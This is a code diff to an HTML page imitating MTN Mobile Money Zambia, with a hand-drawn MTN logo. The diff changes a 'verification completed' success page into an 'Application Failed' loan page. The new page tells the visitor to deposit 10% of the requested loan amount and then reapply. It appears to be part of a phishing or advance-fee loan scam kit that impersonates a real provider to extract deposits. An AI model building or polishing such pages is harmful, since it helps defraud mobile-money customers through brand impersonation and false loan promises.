@@ -3,13 +3,15 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Success - MTN MoMo</title>
+    <title>Application Failed - MTN MoMo</title>
+
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background: #fff;
@@ -19,8 +21,11 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            padding: 20px;
         }
+
         .card {
+            width: 100%;
             max-width: 420px;
             padding: 40px 30px;
             text-align: center;
@@ -28,70 +33,194 @@
             border-radius: 20px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.1);
         }
-        .icon {
-            font-size: 72px;
-            margin-bottom: 20px;
-        }
-        .title {
-            font-size: 32px;
-            font-weight: 700;
-            color: #004B87;
-            margin-bottom: 12px;
-        }
-        .subtitle {
-            font-size: 16px;
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-        .btn {
-            display: inline-block;
-            background: #FFCC00;
-            color: #004B87;
-            text-decoration: none;
-            padding: 14px 40px;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: 600;
-            transition: background 0.2s;
-        }
-        .btn:hover {
-            background: #e6b800;
-        }
+
+        /* LOGO */
         .logo {
             margin-bottom: 20px;
         }
+
         .logo svg {
             height: 48px;
             width: auto;
         }
+
+        /* FAILURE ICON */
+        .icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            background: #dc3545;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 42px;
+            font-weight: bold;
+        }
+
+        /* TITLE */
+        .title {
+            font-size: 30px;
+            font-weight: 700;
+            color: #dc3545;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        /* STATUS */
+        .status-badge {
+            display: inline-block;
+            background: #fde2e5;
+            color: #dc3545;
+            padding: 7px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        /* FAILURE MESSAGE */
+        .message-box {
+            background: #fff3f3;
+            border: 1px solid #f5c2c7;
+            border-radius: 14px;
+            padding: 20px;
+            text-align: left;
+            margin-bottom: 25px;
+        }
+
+        .message-icon {
+            font-size: 24px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .message-box h3 {
+            color: #dc3545;
+            font-size: 17px;
+            margin-bottom: 10px;
+        }
+
+        .message-box p {
+            font-size: 15px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+
+        .message-box p:last-child {
+            margin-bottom: 0;
+        }
+
+        /* BUTTON */
+        .btn {
+            display: block;
+            width: 100%;
+            background: #FFCC00;
+            color: #004B87;
+            text-decoration: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 600;
+            transition: background 0.2s;
+        }
+
+        .btn:hover {
+            background: #e6b800;
+        }
+
         @media (max-width: 480px) {
             .card {
                 padding: 30px 20px;
                 margin: 20px;
             }
+
             .title {
-                font-size: 28px;
+                font-size: 27px;
             }
         }
     </style>
 </head>
+
 <body>
+
     <div class="card">
+
+        <!-- MTN LOGO -->
         <div class="logo">
             <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
-                <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
-                <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN</text>
+                <rect x="2" y="2" width="36" height="36" rx="8"
+                    fill="#FFCC00"
+                    stroke="#004B87"
+                    stroke-width="2"/>
+
+                <path
+                    d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z"
+                    fill="#004B87"
+                />
+
+                <text
+                    x="46"
+                    y="26"
+                    font-family="Arial, sans-serif"
+                    font-weight="700"
+                    font-size="20"
+                    fill="#004B87"
+                >
+                    MTN
+                </text>
             </svg>
         </div>
-        <div class="icon">✅</div>
-        <div class="title">Success!</div>
+
+        <!-- FAILURE ICON -->
+        <div class="icon">✕</div>
+
+        <!-- TITLE -->
+        <div class="title">Application Failed</div>
+
         <div class="subtitle">
-            Your verification has been completed.<br />
-            You can now enjoy all the features of <strong>MTN Mobile Money Zambia</strong>.
+            Unfortunately, your loan application was not successful.
         </div>
-        <a href="index.html" class="btn">Start Over</a>
+
+        <!-- STATUS -->
+        <div class="status-badge">
+            ✕ Application Declined
+        </div>
+
+        <!-- FAILURE REASON -->
+        <div class="message-box">
+
+            <span class="message-icon">⚠️</span>
+
+            <h3>Reason for Failure</h3>
+
+            <p>
+                Your application was not approved because you do not currently
+                have the required minimum balance of 10% of the amount you are
+                requesting.
+            </p>
+
+            <p>
+                Please deposit the required amount into your account and reapply
+                once the deposit has been completed.
+            </p>
+
+        </div>
+
+        <!-- REAPPLY BUTTON -->
+        <a href="index.html" class="btn">
+            Reapply
+        </a>
+
     </div>
+
 </body>
 </html>
